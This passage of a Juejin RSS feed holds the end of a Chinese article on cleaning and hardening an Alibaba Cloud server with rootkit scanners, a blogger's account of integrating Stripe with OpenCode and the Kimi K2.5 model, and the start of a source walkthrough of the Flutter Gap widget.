<li>或直接依赖<strong>阿里云安全组</strong>：只开放必要端口（如 80、443、自定义 SSH 端口）</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-1">三、<strong>使用安全工具扫描</strong></h3>
<ol>
<li>
<p><strong>安装杀毒/恶意软件扫描工具</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.clamav.net%2F" target="_blank" title="https://www.clamav.net/" ref="nofollow noopener noreferrer">ClamAV</a>（开源杀毒）</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsourceforge.net%2Fprojects%2Frkhunter%2F" target="_blank" title="https://sourceforge.net/projects/rkhunter/" ref="nofollow noopener noreferrer">rkhunter</a>（检测 rootkit）</li>
<li><a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.chkrootkit.org%2F" target="_blank" title="http://www.chkrootkit.org/" ref="nofollow noopener noreferrer">chkrootkit</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcisofy.com%2Flynis%2F" target="_blank" title="https://cisofy.com/lynis/" ref="nofollow noopener noreferrer">Lynis</a>（系统安全审计）</li>
</ul>
<p>示例安装 rkhunter：</p>
<pre><code class="hljs language-css" lang="css">sudo apt install rkhunter -y
sudo rkhunter <span class="hljs-attr">--update</span>
sudo rkhunter <span class="hljs-attr">--check</span>
</code></pre>
</li>
<li>
<p><strong>使用阿里云自带的安全产品</strong></p>
<ul>
<li>
<p><strong>云安全中心（原安骑士）</strong> ：免费版即可监控入侵、病毒、漏洞。</p>
<ul>
<li>登录 <a href="https://link.juejin.cn?target=https%3A%2F%2Fyundun.console.aliyun.com%2F" target="_blank" title="https://yundun.console.aliyun.com/" ref="nofollow noopener noreferrer">阿里云控制台 &gt; 云安全中心</a></li>
<li>开启“病毒查杀”、“基线检查”、“入侵检测”</li>
</ul>
</li>
<li>
<p>若未开启，请立即启用，并全盘扫描。</p>
</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-2">四、<strong>长期防护建议</strong></h3>
<ol>
<li><strong>最小权限原则</strong>：不要用 root 运行业务程序。</li>
<li><strong>定期备份</strong>：使用快照或 OSS 备份关键数据。</li>
<li><strong>启用多因素认证（MFA）</strong> ：保护阿里云账号。</li>
<li><strong>日志集中管理</strong>：将 <code>/var/log/</code> 日志发送到 SLS（日志服务）便于分析。</li>
<li><strong>定期安全审计</strong>：每月检查一次用户、端口、进程、定时任务。</li>
</ol>
<hr/>
<h3 data-id="heading-3">五、<strong>如果已严重感染？</strong></h3>
<ul>
<li>
<p><strong>最彻底的方式</strong>：</p>
<ol>
<li>创建当前系统快照（用于取证）</li>
<li><strong>重装系统</strong>（使用阿里云提供的干净镜像）</li>
<li><strong>仅恢复确认干净的数据</strong>（不要恢复可执行文件或脚本）</li>
<li>重新部署应用，并应用上述安全措施</li>
</ol>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[免费接入 Stripe，不到 2 小时搞定：OpenCode + K2.5 实操全流程]]></title>    <link>https://juejin.cn/post/7600986252448972840</link>    <guid>https://juejin.cn/post/7600986252448972840</guid>    <pubDate>2026-01-30T12:26:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600986252448972840" data-draft-id="7600799940971495464" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="免费接入 Stripe，不到 2 小时搞定：OpenCode + K2.5 实操全流程"/> <meta itemprop="keywords" content="AI编程,AIGC,OpenAI"/> <meta itemprop="datePublished" content="2026-01-30T12:26:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="孟健AI编程"/> <meta itemprop="url" content="https://juejin.cn/user/4212984287073895"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            免费接入 Stripe，不到 2 小时搞定：OpenCode + K2.5 实操全流程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984287073895/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    孟健AI编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:26:16.000Z" title="Fri Jan 30 2026 12:26:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是孟健。</p>
<p>今天尝试用 OpenCode 的<strong>免费 K2.5 模型</strong>接入 Stripe，整个过程非常丝滑，<strong>一分钱没花</strong>，不到 2 小时就搞定了。</p>
<p>K2.5 整体表现挺强的，响应快、额度充裕，把完整过程分享给大家。</p>
<h2 data-id="heading-0">01 连接模型</h2>
<p>安装好 OpenCode 之后，输入 <code>/connect</code> 命令来连接模型：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c903e0813ee243778908f0ca5c1d7aed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=BY1uLlvy5NPxtj3cPON9C69QVUA%3D" alt="" loading="lazy"/></p>
<p>选择 <strong>Opencode Zen</strong>：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7bd21a530cb243acbb48954502edc847~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=%2BFpeU8D4TdR4WVNdeEAGO3zG%2Fj0%3D" alt="" loading="lazy"/></p>
<p>然后输入你的 API Key 就可以使用了。Key 可以去 OpenCode 官网的 Zen 模块申请：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fopencode.ai%2F" target="_blank" title="https://opencode.ai/" ref="nofollow noopener noreferrer">opencode.ai/</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17451ae345bb4f54ab182dad71535061~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=w5Vm%2BlOizvmGTCDiHyk3afSOZns%3D" alt="" loading="lazy"/></p>
<p>输入完 Key 之后，会发现有 <strong>5 个模型都可以免费使用</strong>：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/705f3a90d1144e548a3206e0a46d6698~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=9OQsiQAe%2BvpgmdA5%2FiyhK23WWOE%3D" alt="" loading="lazy"/></p>
<p>选择 <strong>Kimi K2.5 Free</strong>，就可以开始了。</p>
<h2 data-id="heading-1">02 让 K2.5 帮我接 Stripe</h2>
<p>因为我是第一次接入 Stripe，也没有底，所以先让它给点建议：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb8e2f50f1c84057bd91b9f6ab1aa48f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=4KW9hx6jdMtc3ShMc9PG8bFK3P8%3D" alt="" loading="lazy"/></p>
<p>它告诉我要在 Stripe 后台创建产品：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e37d6c812464b12b9054ab676af5bdf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=dlPwZXavenxHz4KDoLg713ejWVI%3D" alt="" loading="lazy"/></p>
<p>不过我比较懒，不想手动创建，就问它能不能用 API 来搞定：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bfa361622ae42a784add51271894d05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=ThbF3qlMdg%2BtGub1J7CLPdnjgyA%3D" alt="" loading="lazy"/></p>
<p>它直接帮我写了一个脚本，只需要填入密钥就好。我去 Stripe 后台拿到密钥，填进去：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a74d5ab16274ab98c3e917f5c49af6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=E0m09wXcNj2jQUfqj8CfpIszH3s%3D" alt="" loading="lazy"/></p>
<p>然后，<strong>它一把帮我把代码写好了，产品也创建好了</strong>：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0671b0b5d5254aaeab15b1fa463ba8f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=HkIlufmsgtVJL%2BRQwd0kbaj0gD8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">03 创建 Webhooks</h2>
<p>接下来是创建 Webhooks。我还是比较懒，看看它能不能帮我创建——结果<strong>直接一键搞定</strong>：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e82cd7bec8ad48cf9abb33cd37c8b6ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=PWpADvxinMWbpg0s0t6ayG8SE7c%3D" alt="" loading="lazy"/></p>
<p>我给它一个本地调试地址，它替换到 Webhooks 里，告诉我可以测试了：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/354909a348ec4014bf82c936ba54b9a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=9KWIYYdoDyNvcWUPpT0hCl%2FXczo%3D" alt="" loading="lazy"/></p>
<p><strong>付款一次成功，没有任何波折：</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3b3797ed32e4765a94229696fc1d5af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770380776&amp;x-signature=K49p2nJ8NE37e7c3%2BYXJRUeZHNU%3D" alt="" loading="lazy"/></p>
<p>接下来就是正式环境再来一遍，直接部署上线。</p>
<h2 data-id="heading-3">04 写在最后</h2>
<p>整个过程不到 2 小时，我就把 Stripe 接完了。</p>
<p>K2.5 整体响应速度很快，而且 Free 额度一点也不卡顿，非常充裕——我接完整个 Stripe 都没遇到任何限制。</p>
<p><strong>推荐大家都去试试。</strong></p>
<hr/>
<p>🚀 想要与更多AI爱好者交流，共同成长吗？</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FZ4k_5_waWJbRRo5lZBZmog" target="_blank" title="https://mp.weixin.qq.com/s/Z4k_5_waWJbRRo5lZBZmog" ref="nofollow noopener noreferrer">和一群志同道合的人，持续精进 AI 的每一天</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[flutter添加间隙gap源码解析]]></title>    <link>https://juejin.cn/post/7601028900885446702</link>    <guid>https://juejin.cn/post/7601028900885446702</guid>    <pubDate>2026-01-30T12:46:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601028900885446702" data-draft-id="7600967006893637641" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="flutter添加间隙gap源码解析"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-30T12:46:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Nicholas68"/> <meta itemprop="url" content="https://juejin.cn/user/1222312662146766"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            flutter添加间隙gap源码解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1222312662146766/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Nicholas68
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:46:13.000Z" title="Fri Jan 30 2026 12:46:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Flutter 小部件，可轻松在 Flex 小部件（如列和行）或滚动视图中添加间隙。</p>
<p><code>Gap</code>的核心原理是使用<code>RenderObject</code>自定义实现布局。</p>
<h2 data-id="heading-0">Gap</h2>
<pre><code class="hljs language-scala" lang="scala">
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Gap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  const <span class="hljs-type">Gap</span>(
    <span class="hljs-keyword">this</span>.mainAxisExtent, {
    <span class="hljs-type">Key</span>? key,
    <span class="hljs-keyword">this</span>.crossAxisExtent,
    <span class="hljs-keyword">this</span>.color,
  })  : assert(mainAxisExtent &gt;= <span class="hljs-number">0</span> &amp;&amp; mainAxisExtent &lt; double.infinity),
        assert(crossAxisExtent == <span class="hljs-literal">null</span> || crossAxisExtent &gt;= <span class="hljs-number">0</span>),
        <span class="hljs-keyword">super</span>(key: key);

  const <span class="hljs-type">Gap</span>.expand(
    double mainAxisExtent, {
    <span class="hljs-type">Key</span>? key,
    <span class="hljs-type">Color</span>? color,
  }) : <span class="hljs-keyword">this</span>(
          mainAxisExtent,
          key: key,
          crossAxisExtent: double.infinity,
          color: color,
        );

  <span class="hljs-keyword">final</span> double mainAxisExtent;

  <span class="hljs-keyword">final</span> double? crossAxisExtent;

  <span class="hljs-keyword">final</span> <span class="hljs-type">Color</span>? color;

  <span class="hljs-meta">@override</span>
  <span class="hljs-type">Widget</span> build(<span class="hljs-type">BuildContext</span> context) {
    <span class="hljs-keyword">final</span> scrollableState = <span class="hljs-type">Scrollable</span>.maybeOf(context);
    <span class="hljs-keyword">final</span> <span class="hljs-type">AxisDirection</span>? axisDirection = scrollableState?.axisDirection;
    <span class="hljs-keyword">final</span> <span class="hljs-type">Axis</span>? fallbackDirection =
        axisDirection == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : axisDirectionToAxis(axisDirection);

    <span class="hljs-keyword">return</span> _RawGap(
      mainAxisExtent,
      crossAxisExtent: crossAxisExtent,
      color: color,
      fallbackDirection: fallbackDirection,
    );
  }
}
</code></pre>
<p>从源码看, 它提供了两个构造方法, <code>Gap</code>和<code>Gap.expand</code>方便用户按需使用。</p>
<h2 data-id="heading-1">_RawGap</h2>
<p><code>_RawGap</code>是核心类, 它继承了<code>LeafRenderObjectWidget</code>.</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_RawGap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">LeafRenderObjectWidget</span> </span>{
  <span class="hljs-keyword">const</span> _RawGap(
    <span class="hljs-keyword">this</span>.mainAxisExtent, {
    Key? key,
    <span class="hljs-keyword">this</span>.crossAxisExtent,
    <span class="hljs-keyword">this</span>.color,
    <span class="hljs-keyword">this</span>.fallbackDirection,
  })  : <span class="hljs-keyword">assert</span>(mainAxisExtent &gt;= <span class="hljs-number">0</span> &amp;&amp; mainAxisExtent &lt; <span class="hljs-built_in">double</span>.infinity),
        <span class="hljs-keyword">assert</span>(crossAxisExtent == <span class="hljs-keyword">null</span> || crossAxisExtent &gt;= <span class="hljs-number">0</span>),
        <span class="hljs-keyword">super</span>(key: key);

  <span class="hljs-keyword">final</span> <span class="hljs-built_in">double</span> mainAxisExtent;

  <span class="hljs-keyword">final</span> <span class="hljs-built_in">double?</span> crossAxisExtent;

  <span class="hljs-keyword">final</span> Color? color;

  <span class="hljs-keyword">final</span> Axis? fallbackDirection;

  <span class="hljs-meta">@override</span>
  RenderObject createRenderObject(BuildContext context) {
    <span class="hljs-keyword">return</span> RenderGap(
      mainAxisExtent: mainAxisExtent,
      crossAxisExtent: crossAxisExtent ?? <span class="hljs-number">0</span>,
      color: color,
      fallbackDirection: fallbackDirection,
    );
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> updateRenderObject(BuildContext context, RenderGap renderObject) {
    <span class="hljs-keyword">if</span> (kDebugMode) {
      debugPrint(
        <span class="hljs-string">'[Gap] updateRenderObject '</span>
        <span class="hljs-string">'mainAxisExtent=<span class="hljs-subst">$mainAxisExtent</span> '</span>
